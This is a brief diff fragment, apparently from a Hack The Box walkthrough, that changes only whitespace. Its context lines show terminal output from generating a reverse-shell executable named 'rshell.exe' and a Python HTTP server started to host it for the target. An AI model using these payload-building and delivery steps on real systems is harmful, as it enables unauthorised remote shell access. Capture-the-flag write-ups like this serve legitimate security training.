@@ -388,7 +388,8 @@ No encoder specified, outputting raw payload
 Payload size: 354 bytes
 Final size of exe file: 73802 bytes
 Saved as: rshell.exe
-                                                                           
+
+
 ┌──(kali㉿kali)-[~/htb]
 └─$ python -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
